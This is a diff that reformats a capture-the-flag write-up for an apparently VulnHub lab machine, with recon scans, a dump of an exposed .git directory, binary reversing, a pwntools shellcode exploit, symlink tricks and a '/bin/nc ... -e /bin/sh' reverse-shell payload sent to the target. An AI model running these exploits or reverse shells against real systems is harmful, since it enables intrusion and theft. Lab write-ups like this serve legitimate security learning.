@@ -1,8 +1,10 @@
-Recon phase
-netdiscover -r 172.16.34.0/24 -i vmnet8
+Recon phase:
+
+
+$ netdiscover -r 172.16.34.0/24 -i vmnet8
 172.16.34.149
 
-nmap -p 1-65535 -T4 -A -v 172.16.34.149
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.149
 PORT     STATE SERVICE  VERSION
 22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
 | ssh-hostkey:
@@ -21,15 +23,15 @@ PORT     STATE SERVICE  VERSION
 |_http-title: baffle
 6969/tcp open  acmsoda?
 
-dirb http://172.16.34.149
+$ dirb http://172.16.34.149
 
 ---- Scanning URL: http://172.16.34.149/ ----
 + http://172.16.34.149/.git/HEAD (CODE:200|SIZE:23)
 ============================================================================
 i downloaded .git file
-wget -r http://172.16.34.149/.git/
+$ wget -r http://172.16.34.149/.git/
 
-cat 172.16.34.149/.git/logs/HEAD
+$ cat 172.16.34.149/.git/logs/HEAD
 
 0000000000000000000000000000000000000000 7f904e66033e780204d4f1d17b0e735a248e96cf
 root <root@binariez> 1476728711 -0400
@@ -54,13 +56,13 @@ alice <alice@baffle.me> 1476730682 -0400
 commit: Trashed my code, but deployed the product anyway.
 
 
-git clone .git new
+$ git clone .git new
 
 i tried all commits then i got this commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
-git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+$ git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
 i found project.enc
 it's base64 so i converted it
-cat project.enc | base64 -d > project
+$ cat project.enc | base64 -d > project
 its executable file
 while debugging it using gdb -q project i noticed that the main function call a function parse_request
 0x0000000000400746 <+0>:	push   %rbp
@@ -100,8 +102,8 @@ while debugging it using gdb -q project i noticed that the main function call a 
 then i tried to disassemble it and i noticed its connected to port 6969
 and it use to open a file and then read it by using fopen call and number of characters
 let's use ltrace to feed it with a file to read
-echo "Hiiiii" > newfile
-python -c'print "\x01\x01newfile"' | ltrace ./project
+$ echo "Hiiiii" > newfile
+$ python -c'print "\x01\x01newfile"' | ltrace ./project
 __libc_start_main(0x4008f7, 1, 0x7fff97dea508, 0x400980 <unfinished ...>
 setbuf(0x7fd20b599600, 0)                                            = <void>
 memset(0x7fff97de9c40, '\0', 2000)                                   = 0x7fff97de9c40
@@ -113,7 +115,7 @@ fopen("n", "r")                                                      = 0
 +++ exited (status 0) +++
 
 after traying
-python -c'print "\x01\x01newfilezzzzzz"' | ltrace ./project
+$ python -c'print "\x01\x01newfilezzzzzz"' | ltrace ./project
 __libc_start_main(0x4008f7, 1, 0x7ffd77c50828, 0x400980 <unfinished ...>
 setbuf(0x7f6fb4add600, 0)                                            = <void>
 memset(0x7ffd77c4ff60, '\0', 2000)                                   = 0x7ffd77c4ff60
@@ -131,7 +133,7 @@ printf("%s", "Hiiiii\n"Hiiiii
 so i tried with 6969 port
 so i tried with file flag.txt
 
-python -c'print "\x01\x01flag.txtxxxxxx"' | nc 172.16.34.149 6969
+$ python -c'print "\x01\x01flag.txtxxxxxx"' | nc 172.16.34.149 6969
 FLAG{is_there_an_ivana_tinkle} ==> First flag
 ============================================================================
 in commit 06483346fab91b2b17471074a887ac7dffd9ceda i noticed changes in code from
@@ -147,11 +149,11 @@ capital to small characters in hellofriend.c
 
 so back to this commit and try to extract those capita characters
 git checkout 06483346fab91b2b17471074a887ac7dffd9ceda
-grep -o "[A-Z]" hellofriend.c | tr -d '\n'
+$ grep -o "[A-Z]" hellofriend.c | tr -d '\n'
 FILEFLAGARSEREQUEST ==> Second flag
 ============================================================================
 let's try a shellcode
-
+----------------
 from pwn import *
 from struct import *
 
@@ -180,13 +182,15 @@ except EOFError as e:
 finally:
     with context.quiet:
         p.close()
+----------------
+
 i took the idea of shellcode from zionspike
 
 after execute
 [+] Opening connection to 172.16.34.149 on port 6969: Done
 [*] Switching to interactive mode
 i found a message
-cat /var/mail/alice
+$ cat /var/mail/alice
 
 From bob@baffle.me  Thu Jan  2 11:38:22 2014
 Return-Path: <root@baffle.me>
@@ -209,7 +213,7 @@ You'll need to authenticate to Flag Vault in order to get its contents.
 Bob
 
 then i went to bob/filez
-./flag_vault
+$  ./flag_vault
 
 ______ _                _    _   _             _ _
 |  ___| |            /\| |/\| | | |           | | |
@@ -223,9 +227,9 @@ ______ _                _    _   _             _ _
 ENTER YOUR AUTHENTICATION CODE: $
 
 then i tried making a link in alice home directory
-ln -s flag_vault /home/alice/flag_vault
-ln -s /flag.txt /home/alice/flag.txt
-echo hii > auth.txt
+$ ln -s flag_vault /home/alice/flag_vault
+$ ln -s /flag.txt /home/alice/flag.txt
+$ echo hii > auth.txt
 then i use the same work "hii"
 $ ./flag_vault
 ______ _                _    _   _             _ _
@@ -243,12 +247,12 @@ DATA: FLAG{tr3each3ry_anD_cUnn1ng} ==> Third flag
 ============================================================================
 So "tr3each3ry_anD_cUnn1ng" is bob's login
 then i tried to access via ssh
-ssh bob@172.16.34.149
+$ ssh bob@172.16.34.149
 then i navigated to binz
-./ctfingerd
+$ ./ctfingerd
 bind: Address already in use
 Let's dig up
-netstat -antp
+$ netstat -antp
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
@@ -261,7 +265,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -
 notice 7979
 i tried to connect to using nc
-nc 127.0.0.1 7979
+$ nc 127.0.0.1 7979
 Socket fd: 7
 User to query: bob
 Checking...
@@ -277,10 +281,10 @@ So this read .plan file inside /home/{username}
 but the .plan in charlie sure contain "I haz a flag mwahahaha"
 So i created a new directory
 mkdir new
-ln -s /home/charlie/flag.txt new/
+$ ln -s /home/charlie/flag.txt new/
 
 Then
-nc 127.0.0.1 7979
+$ nc 127.0.0.1 7979
 Socket fd: 13
 User to query: bob/new
 Checking...
@@ -415,14 +419,14 @@ for i in range(0, 1000):
         s.send('/bin/nc 1172.16.34.1 1234 -e /bin/sh\x00')
 --------------
 and from kali machine i executed
-nc -lvp 1234
-then i got a shell
-cat flag.txt
+$ nc -lvp 1234
+then i got a shell as vulnhub
+$ cat flag.txt
 Sorry Mario. The flag is in another castle.
-cd .my_loot
-ls
-flag.txt
-cat flag.txt
+$ cd .my_loot
+$ ls
+$ flag.txt
+$ cat flag.txt
 
 
         !!! CONGRATULATIONS !!!
